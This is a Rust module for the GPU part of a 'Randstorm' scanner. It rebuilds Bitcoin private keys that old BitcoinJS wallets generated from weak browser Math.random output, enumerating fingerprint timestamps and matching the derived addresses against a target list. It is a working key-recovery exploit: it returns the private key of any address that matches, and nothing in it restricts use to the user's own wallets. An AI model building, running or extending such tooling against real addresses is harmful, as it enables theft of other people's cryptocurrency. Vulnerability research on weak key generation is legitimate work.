//! GPU Integration for Randstorm Scanner
//!
//! This module handles OpenCL GPU acceleration for the Randstorm vulnerability scanner.
//! It follows the existing GPU patterns from gpu_solver.rs while being optimized for
//! the specific requirements of browser fingerprint enumeration.

use anyhow::{Context, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use std::time::Instant;
#[cfg(feature = "gpu")]
use ocl::enums::DeviceInfoResult;
#[cfg(feature = "gpu")]
use ocl::{Buffer, Context as OclContext, Device, Kernel, Platform, Program, Queue};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

use super::config::ScanConfig;
use super::fingerprint::BrowserFingerprint;

/// GPU-accelerated Randstorm scanner
#[cfg(feature = "gpu")]
pub struct GpuScanner {
    queue: Queue,
    kernel: Kernel,
    device: Device,
    keys_checked: Arc<AtomicU64>,
    running: Arc<AtomicBool>,
    #[allow(dead_code)]
    engine: super::prng::MathRandomEngine,
}

/// Stub for non-GPU builds
#[cfg(not(feature = "gpu"))]
pub struct GpuScanner {
    keys_checked: Arc<AtomicU64>,
    running: Arc<AtomicBool>,
    #[allow(dead_code)]
    engine: super::prng::MathRandomEngine,
}

/// Result from GPU batch processing
#[derive(Debug)]
pub struct GpuBatchResult {
    pub keys_processed: u64,
    pub matches_found: Vec<MatchedKey>,
    pub elapsed_ms: u64,
}

/// A key that matched a target address
#[derive(Debug, Clone)]
pub struct MatchedKey {
    pub private_key: SecretKey,
    pub public_key: PublicKey,
    pub address: String,
    pub fingerprint: BrowserFingerprint,
}

impl GpuScanner {
    /// Initialize GPU scanner with OpenCL
    #[cfg(feature = "gpu")]
    pub fn new(
        _config: ScanConfig,
        engine: super::prng::MathRandomEngine,
        _seed_override: Option<u64>,
        _include_uncompressed: bool,
    ) -> Result<Self> {
        // Select platform and device (following gpu_solver.rs pattern)
        let platform = Platform::default();
        let device = Device::first(platform).context("No OpenCL device found")?;

        println!("🔧 Initializing GPU: {}", device.name()?);
        let max_compute_units_result = device.info(ocl::enums::DeviceInfo::MaxComputeUnits)?;
        let global_mem = device.info(ocl::enums::DeviceInfo::GlobalMemSize)?;

        println!(
            "   Max compute units: {}",
            if let DeviceInfoResult::MaxComputeUnits(units) = max_compute_units_result {
                units
            } else {
                0
            }
        );
        println!("   Max work group size: {}", device.max_wg_size()?);
        println!(
            "   Global memory: {} MB",
            if let DeviceInfoResult::GlobalMemSize(mem) = global_mem {
                mem / 1024 / 1024
            } else {
                0
            }
        );

        // Create context and queue
        let context = OclContext::builder()
            .platform(platform)
            .devices(device)
            .build()
            .context("Failed to create OpenCL context")?;

        let queue = Queue::new(&context, device, None).context("Failed to create command queue")?;

        // Load and compile kernel
        let kernel_source = include_str!("../../../../../cl/randstorm_scan_bloom.cl");
        let program = Program::builder()
            .src(kernel_source)
            .devices(device)
            .build(&context)
            .context("Failed to build OpenCL program")?;

        let kernel = Kernel::builder()
            .name("randstorm_check_bloom")
            .program(&program)
            .queue(queue.clone())
            .build()
            .context("Failed to create kernel")?;

        Ok(Self {
            queue,
            kernel,
            device,
            keys_checked: Arc::new(AtomicU64::new(0)),
            running: Arc::new(AtomicBool::new(true)),
            engine,
        })
    }

    /// Stub for non-GPU builds
    #[cfg(not(feature = "gpu"))]
    pub fn new(
        _config: ScanConfig,
        engine: super::prng::MathRandomEngine,
        _seed_override: Option<u64>,
        _include_uncompressed: bool,
    ) -> Result<Self> {
        Ok(Self {
            keys_checked: Arc::new(AtomicU64::new(0)),
            running: Arc::new(AtomicBool::new(true)),
            engine,
        })
    }

    /// Calculate optimal batch size based on device capabilities
    #[cfg(feature = "gpu")]
    pub fn calculate_batch_size(&self) -> Result<usize> {
        let max_compute_units_result = self.device.info(ocl::enums::DeviceInfo::MaxComputeUnits)?;
        let max_compute_units =
            if let DeviceInfoResult::MaxComputeUnits(units) = max_compute_units_result {
                units as usize
            } else {
                16 // Fallback default
            };
        let max_wg_size = self.device.max_wg_size()? as usize;

        // Follow gpu_solver.rs pattern: multiply compute units by work group size
        let optimal_batch = max_compute_units * max_wg_size * 64;

        // Cap at 1M keys per batch if not specified
        let max_batch = 1_000_000;
        Ok(optimal_batch.min(max_batch))
    }

    #[cfg(not(feature = "gpu"))]
    pub fn calculate_batch_size(&self) -> Result<usize> {
        Ok(1000) // Stub
    }

    /// Process a batch of fingerprints on GPU
    #[cfg(feature = "gpu")]
    pub fn process_batch(
        &mut self,
        fingerprints: &[BrowserFingerprint],
        target_hashes: &[Vec<u8>], // 20-byte address hashes
        num_targets: u32,
        bloom_buffer: Option<&Buffer<u8>>,
    ) -> Result<GpuBatchResult> {
        let start_time = Instant::now();
        let batch_size = fingerprints.len();

        if batch_size == 0 {
            return Ok(GpuBatchResult {
                keys_processed: 0,
                matches_found: Vec::new(),
                elapsed_ms: 0,
            });
        }

        // Map MathRandomEngine to GPU engine_type constant
        let engine_type: u32 = match self.engine {
            super::prng::MathRandomEngine::V8Mwc1616 => 0,
            super::prng::MathRandomEngine::SpiderMonkeyLcg | 
            super::prng::MathRandomEngine::IeChakraLcg |
            super::prng::MathRandomEngine::JavaUtil => 1,
            super::prng::MathRandomEngine::SafariWindowsCrt => 2,
            _ => 0, // Default to V8 for now
        };

        // Prepare input data: pack fingerprints into GPU format
        // The new kernel expects ulong *fingerprints_raw with [timestamp, 0, 0] etc for each FP
        let mut input_data = Vec::with_capacity(batch_size * 3);
        for fp in fingerprints {
            input_data.push(fp.timestamp_ms);
            input_data.push(fp.screen_width as u64);
            input_data.push(fp.screen_height as u64);
        }

        // Flatten target addresses into single buffer
        let mut target_data = Vec::with_capacity(num_targets as usize * 20);
        for i in 0..num_targets as usize {
            target_data.extend_from_slice(&target_hashes[i]);
        }

        // Create GPU buffers
        let input_buffer = Buffer::<u64>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_READ_ONLY)
            .len(input_data.len())
            .build()
            .context("Failed to create input buffer")?;

        let target_buffer = Buffer::<u8>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_READ_ONLY)
            .len(target_data.len())
            .build()
            .context("Failed to create target buffer")?;

        let output_buffer = Buffer::<u32>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_WRITE_ONLY)
            .len(batch_size)
            .build()
            .context("Failed to create output buffer")?;

        // Write input data to GPU
        input_buffer
            .write(&input_data)
            .enq()
            .context("Failed to write input data")?;
        target_buffer
            .write(&target_data)
            .enq()
            .context("Failed to write target data")?;

        // Set kernel arguments
        // Signature: (raw_fingerprints, batch_size, bloom_filter, bloom_size, target_hashes, num_targets, engine_type, output_matches)
        self.kernel.set_arg(0, &input_buffer)?;
        self.kernel.set_arg(1, batch_size as u32)?;
        
        if let Some(bloom) = bloom_buffer {
            self.kernel.set_arg(2, bloom)?;
            self.kernel.set_arg(3, bloom.len() as u32)?;
        } else {
            // Fallback: pass a dummy small buffer if no bloom provided
            // Re-think: maybe we always require a bloom?
            anyhow::bail!("Bloom filter buffer is required for randstorm_check_bloom");
        }
        
        self.kernel.set_arg(4, &target_buffer)?;
        self.kernel.set_arg(5, num_targets)?;
        self.kernel.set_arg(6, engine_type)?;
        self.kernel.set_arg(7, &output_buffer)?;

        // Execute kernel
        unsafe {
            self.kernel
                .cmd()
                .queue(&self.queue)
                .global_work_size(batch_size)
                .enq()
                .context("Failed to execute kernel")?;
        }

        // Read results
        let mut results = vec![0u32; batch_size];
        output_buffer
            .read(&mut results)
            .enq()
            .context("Failed to read results")?;

        // Process matches
        let mut matches = Vec::new();
        let secp = Secp256k1::new();

        for (idx, &match_val) in results.iter().enumerate() {
            if match_val > 0 {
                // Recreate the key from fingerprint (CPU verification)
                let fp = &fingerprints[idx];
                if let Ok(secret_key) = self.derive_key_from_fingerprint(fp) {
                    let public_key = PublicKey::from_secret_key(&secp, &secret_key);
                    // Generate address for verification
                    let address =
                        crate::scans::randstorm::derivation::derive_p2pkh_address(&public_key);

                    matches.push(MatchedKey {
                        private_key: secret_key,
                        public_key,
                        address,
                        fingerprint: fp.clone(),
                    });
                }
            }
        }

        let elapsed_ms = start_time.elapsed().as_millis() as u64;
        self.keys_checked
            .fetch_add(batch_size as u64, Ordering::Relaxed);

        Ok(GpuBatchResult {
            keys_processed: batch_size as u64,
            matches_found: matches,
            elapsed_ms,
        })
    }

    /// Derive private key from browser fingerprint (CPU implementation for verification)
    #[allow(dead_code)]
    fn derive_key_from_fingerprint(
        &self,
        fp: &BrowserFingerprint,
    ) -> Result<SecretKey> {
        use super::prng::bitcoinjs_v013::BitcoinJsV013Prng;

        let key_bytes =
            BitcoinJsV013Prng::generate_privkey_bytes(fp.timestamp_ms, super::prng::MathRandomEngine::V8Mwc1616, None);
        SecretKey::from_slice(&key_bytes).context("Invalid secret key generated from fingerprint")
    }

    /// Get the OpenCL command queue
    #[cfg(feature = "gpu")]
    pub fn queue(&self) -> &Queue {
        &self.queue
    }

    /// Get total keys checked
    pub fn keys_checked(&self) -> u64 {
        self.keys_checked.load(Ordering::Relaxed)
    }

    /// Stop the scanner
    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    /// Check if scanner is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}


#[cfg(feature = "gpu")]
pub struct GpuDerivationBatcher {
    queue: Queue,
    kernel: Kernel,
    #[allow(dead_code)]
    device: Device,
    max_index: u32,
    num_paths: u32,
}

#[cfg(feature = "gpu")]
impl GpuDerivationBatcher {
    pub fn new(max_index: u32) -> Result<Self> {
        let platform = Platform::default();
        let device = Device::first(platform).context("No OpenCL device found")?;
        let context = OclContext::builder()
            .platform(platform)
            .devices(device)
            .build()?;
        let queue = Queue::new(&context, device, None)?;

        // Concatenate sources directly to handle standard includes not being resolved by driver
        let kernel_src = include_str!("../../../../../cl/randstorm_multi_path.cl");
        let sha2_src = include_str!("../../../../../cl/sha2.cl");
        let ripemd_src = include_str!("../../../../../cl/ripemd.cl");
        
        // secp256k1 requires multiple sub-modules in specific order
        let secp256k1_common_src = include_str!("../../../../../cl/secp256k1_common.cl");
        let secp256k1_field_src = include_str!("../../../../../cl/secp256k1_field.cl");
        let secp256k1_scalar_src = include_str!("../../../../../cl/secp256k1_scalar.cl");
        let secp256k1_group_src = include_str!("../../../../../cl/secp256k1_group.cl");
        let secp256k1_prec_src = include_str!("../../../../../cl/secp256k1_prec.cl");
        let secp256k1_src = include_str!("../../../../../cl/secp256k1.cl");
        
        let full_src = format!(
            "{}\n{}\n{}\n{}\n{}\n{}\n{}\n{}",
            sha2_src,
            ripemd_src,
            secp256k1_common_src,
            secp256k1_field_src,
            secp256k1_scalar_src,
            secp256k1_group_src,
            secp256k1_prec_src,
            secp256k1_src,
        );
        
        // Append kernel with includes stripped
        let kernel_cleaned = kernel_src
            .replace("#include \"sha2.cl\"", "")
            .replace("#include \"ripemd.cl\"", "")
            .replace("#include \"secp256k1.cl\"", "");
        let full_src = format!("{}\n{}", full_src, kernel_cleaned);


        // Build with -I options if we were using files, but we are concatenating strings.
        let program = Program::builder()
            .src(full_src)
            .devices(device)
            .build(&context)?;

        let kernel = Kernel::builder()
            .name("randstorm_multi_path")
            .program(&program)
            .queue(queue.clone())
            .build()?;

        Ok(Self {
            queue,
            kernel,
            device,
            max_index,
            num_paths: 4, 
        })
    }
    
    // Batch derive
    // seeds: 32-byte entropy values
    // Returns: flattened buffer of [Ripemd160(20 bytes)]
    pub fn derive_batch(&mut self, seeds: &[Vec<u8>]) -> Result<Vec<u8>> {
        let batch_size = seeds.len();
        if batch_size == 0 { return Ok(Vec::new()); }
        
        // Flatten seeds
        let mut flat_seeds = Vec::with_capacity(batch_size * 32);
        for s in seeds {
            if s.len() != 32 { anyhow::bail!("Invalid seed length: expected 32 bytes, got {} bytes", s.len()); }
            flat_seeds.extend_from_slice(s);
        }
        
        let seed_buffer = Buffer::<u8>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_READ_ONLY)
            .len(flat_seeds.len())
            .copy_host_slice(&flat_seeds)
            .build()?;
            
        // Output size: [batch_size * 4 * max_index * 20 bytes]
        let total_outputs = batch_size * self.num_paths as usize * self.max_index as usize;
        let output_size_bytes = total_outputs * 20;
        
        let output_buffer = Buffer::<u8>::builder()
            .queue(self.queue.clone())
            .flags(ocl::flags::MEM_WRITE_ONLY)
            .len(output_size_bytes)
            .build()?;
            
        // Set kernel args: entropy_pool, num_seeds, start_index, max_index, results
        self.kernel.set_arg(0, &seed_buffer)?;
        self.kernel.set_arg(1, batch_size as u32)?;
        self.kernel.set_arg(2, 0u32)?; 
        self.kernel.set_arg(3, self.max_index)?;
        self.kernel.set_arg(4, &output_buffer)?;
        
        unsafe {
            self.kernel.cmd()
                .queue(&self.queue)
                .global_work_size(batch_size)
                .enq()?;
        }
        
        // Read back
        let mut results = vec![0u8; output_size_bytes];
        output_buffer.read(&mut results).enq()?;
        
        Ok(results)
    }
}

/// Stub for non-GPU builds
#[cfg(not(feature = "gpu"))]
pub struct GpuDerivationBatcher;

#[cfg(not(feature = "gpu"))]
impl GpuDerivationBatcher {
    pub fn new(_max_index: u32) -> Result<Self> {
        anyhow::bail!("GPU feature disabled: GpuDerivationBatcher not available")
    }

    pub fn derive_batch(&mut self, _seeds: &[Vec<u8>]) -> Result<Vec<u8>> {
        anyhow::bail!("GPU feature disabled: GpuDerivationBatcher not available")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bitcoin::secp256k1::Secp256k1;
    fn test_gpu_scanner_initialization() {
        use crate::scans::randstorm::prng::MathRandomEngine;
        let config = ScanConfig::default();
        let engine = MathRandomEngine::V8Mwc1616;
        let scanner = GpuScanner::new(config, engine, None, true);

        // Should succeed if OpenCL is available
        if scanner.is_ok() {
            let scanner = scanner.unwrap();
            assert!(scanner.calculate_batch_size().unwrap() > 0);
        }
    }

    #[test]
    fn test_key_derivation_from_fingerprint() {
        use crate::scans::randstorm::prng::MathRandomEngine;
        let config = ScanConfig::default();
        let engine = MathRandomEngine::V8Mwc1616;
        let scanner = GpuScanner::new(config, engine, None, true);

        if let Ok(scanner) = scanner {
            let fp = BrowserFingerprint {
                timestamp_ms: 1633024800000,
                screen_width: 1920,
                screen_height: 1080,
                color_depth: 24,
                timezone_offset: -420,
                language: "en-US".to_string(),
                platform: "Win32".to_string(),
                user_agent: "Mozilla/5.0".to_string(),
            };

            let key = scanner.derive_key_from_fingerprint(&fp);
            assert!(key.is_ok());

            // Verify key is valid for secp256k1
            let secp = Secp256k1::new();
            let public_key = PublicKey::from_secret_key(&secp, &key.unwrap());
            assert!(public_key.to_string().len() > 0);
        }
    }
}
